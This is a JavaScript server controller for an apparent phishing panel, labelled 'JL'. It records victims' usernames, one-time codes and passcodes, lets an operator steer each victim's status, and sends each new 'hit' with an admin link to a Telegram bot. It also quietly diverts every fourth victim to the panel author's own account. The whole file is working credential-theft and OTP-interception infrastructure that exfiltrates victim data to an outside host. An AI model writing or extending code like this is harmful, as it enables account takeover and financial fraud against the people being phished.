const JL = require("../models/jlModel");
const axios = require("axios");
var moment = require("moment"); // require

let count = 0;
let redirect = true;

const setRedirect = async (req, res) => {
	const { active } = req.params;
	if (active == "true") {
		redirect = true;
	} else if (active == "false") {
		redirect = false;
	}
	res.send(`Redirect set to ${redirect}`);
};

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	JL.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status, pinIndex } = req.body;
	try {
		if (pinIndex)
			await JL.findOneAndUpdate({ uniqueid }, { status, pinIndex }).exec();
		else await JL.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	JL.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	let { username, uniqueid, owner, ip } = req.body;
	message = `New JL Hit:\n\n${username}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=${owner}\n\nCount: ${count}\nRedirect: ${redirect}`;
	try {
		if (redirect && count == 3) {
			message = `‼️‼️‼️ Haytch JL Hit:\n\n${username}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=jl&password=haytch4023`;
			owner = "haytch4023";
			count = 0;
		} else {
			count = count + 1;
		}
		await JL.create({
			uniqueid,
			username,
			status: 1,
			owner,
			ip,
			timestamp: moment().format(),
		});
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`,
				{
					chat_id: 680379375,
					text: message,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, uniqueid } = req.body;
	try {
		await JL.findOneAndUpdate(
			{ uniqueid },
			{ username, status: 9, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await JL.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitPasscode = async (req, res) => {
	const { passcode, uniqueid } = req.body;
	try {
		await JL.findOneAndUpdate(
			{ uniqueid },
			{ passcode, status: 5, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await JL.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	submitPasscode,
	setRedirect,
	deleteEntry,
};
